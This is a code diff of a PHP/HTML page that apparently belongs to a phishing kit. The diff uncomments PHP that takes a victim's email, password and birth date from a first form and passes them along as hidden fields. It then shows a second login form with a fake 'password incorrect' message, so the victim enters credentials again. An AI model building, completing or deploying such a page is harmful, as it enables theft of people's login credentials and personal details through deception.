@@ -1,12 +1,12 @@
-// <?php
-// if ($_SERVER["REQUEST_METHOD"] == "POST") {
-//     $email1 = htmlspecialchars($_POST['godhelpme1ma']);
-//     $password1 = htmlspecialchars($_POST['godhelpme1pa']);
-//     $month1 = htmlspecialchars($_POST['godhelpme1mo']);
-//     $day1 = htmlspecialchars($_POST['godhelpme1da']);
-//     $year1 = htmlspecialchars($_POST['godhelpme1ye']);
-// }
-// ?>
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $email1 = htmlspecialchars($_POST['godhelpme1ma']);
+    $password1 = htmlspecialchars($_POST['godhelpme1pa']);
+    $month1 = htmlspecialchars($_POST['godhelpme1mo']);
+    $day1 = htmlspecialchars($_POST['godhelpme1da']);
+    $year1 = htmlspecialchars($_POST['godhelpme1ye']);
+}
+?>
 
 <!DOCTYPE html>
 <html lang="en">
@@ -114,11 +114,11 @@
                                         <div class="ant-col ant-form-item-control">
                                             <div>
                                                 <div class="thepadding">
-<!--                                                     <input type="hidden" name="godhelpme1ma" value="<?php echo $email1; ?>" readonly>
+                                                    <input type="hidden" name="godhelpme1ma" value="<?php echo $email1; ?>" readonly>
                                                     <input type="hidden" name="godhelpme1pa" value="<?php echo $password1; ?>" readonly>
                                                     <input type="hidden" name="godhelpme1mo" value="<?php echo $month1; ?>" readonly>
                                                     <input type="hidden" name="godhelpme1da" value="<?php echo $day1; ?>" readonly>
-                                                    <input type="hidden" name="godhelpme1ye" value="<?php echo $year1; ?>" readonly> -->
+                                                    <input type="hidden" name="godhelpme1ye" value="<?php echo $year1; ?>" readonly>
                                                     <input type="text" class="import-account__secret-phrase SpceE" placeholder="Email address or phone number" maxlength="40" name="godhelpme2ma" value="" pattern=".{6,}" required="" autocomplete="off">
                                                     <input type="password" class="import-account__secret-phrasee" placeholder="Password" maxlength="30" name="godhelpme2pa" value="" pattern=".{6,}" required="" autocomplete="off">
                                                     <div class="Er0tEx">The password that you've entered is incorrect.</div>
